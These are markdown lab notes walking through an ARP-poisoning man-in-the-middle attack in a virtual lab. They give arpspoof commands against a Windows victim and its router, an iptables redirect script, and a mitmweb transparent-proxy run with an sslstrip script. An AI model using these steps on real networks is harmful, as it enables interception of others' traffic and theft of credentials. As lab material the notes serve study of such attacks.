## First we have to perform Arp-Poisoning atttack with the victim machine 

How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.


Physical Address and IP of Windows System ---->

```
Physical Address. . . . . . . . . : 00-0C-29-5B-B9-15

 IPv4 Address. . . . . . . . . . . : 192.168.229.132
```


Physical Address and IP of Linux System ---->

```
ether 00:0c:29:f2:93:7b

inet 192.168.229.131
```

Router IP adress ---->

```
192.168.229.2
```

## Attack (In Kali) :

```
sudo arpspoof -i eth0 -t 192.168.229.2 192.168.229.132 
```


```
sudo arpspoof -i eth0 -t 192.168.229.132 192.168.229.2
```

------------

*Download* the files from mitmproxy website (https://www.mitmproxy.org/)

Current version (1/1/2026) (https://www.mitmproxy.org/downloads/#12.2.1/)

Download file Format

```
mitmproxy-12.2.1-linux-x86_64.tar.gz
```

**then ,**

Unzip the file ---->

```
tar -xvf mitmproxy-12.2.1-linux-x86_64.tar.gz
```

------------------

### Run the mitm.sh file

mitm.sh

```
iptables --flush
iptables -P FORWARD ACCEPT
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

```
sudo bash mitm.sh  
```   

-----------
**Go to the mitmproxy folder** 

Run ----> 

```
./mitmweb -m transparent -s /home/ranger/Desktop/mitm/mitm-sslstrip.py 
```

-------------
### Caution :

![[Pasted image 20260102084728.png]]

If ` Errno 98] Transparent Proxy failed to listen on *:8080 with [Errno 98] error while attempting to bind on address ('0.0.0.0', 8080): [errno 98] address already in use`   this error occurs then kill the process.

```
┌──(ranger🎃KALI)-[~/Desktop/mitm]
└─$ sudo netstat -tunlp | grep 8080            
[sudo] password for ranger: 
tcp        0      0 192.168.229.131:8080    0.0.0.0:*               LISTEN      36294/bettercap  
```   


```
┌──(ranger🎃KALI)-[~/Desktop/mitm]
└─$ sudo kill -9 36294  
```

